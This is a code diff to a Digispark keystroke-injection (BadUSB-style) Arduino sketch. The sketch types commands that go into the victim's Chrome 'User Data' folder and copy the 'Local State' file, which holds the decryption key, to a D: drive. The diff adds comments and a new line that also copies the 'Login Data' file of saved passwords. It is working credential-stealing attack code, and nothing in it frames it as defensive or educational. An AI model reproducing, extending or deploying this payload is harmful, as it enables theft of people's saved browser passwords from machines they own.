@@ -16,7 +16,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
 	DigiKeyboard.delay(500);
   DigiKeyboard.print(" mkdir D:\\files");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -25,14 +25,17 @@ void loop() {
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("cd $env:USERPROFILE"); 
+	DigiKeyboard.print("cd $env:USERPROFILE"); //change to user profile directory on system
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
 	DigiKeyboard.print("cd AppData\\Local\\Google\\chrome\\'User Data'");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("copy 'Local State' D:\\files\\");
+	DigiKeyboard.print("copy 'Local State' D:\\files\\"); //copying Local State file
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(600);
+	DigiKeyboard.print("copy Default\\'Login Data' D:\\files\\"); //copying Login Data file
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
 	DigiKeyboard.print("cd D:\\");
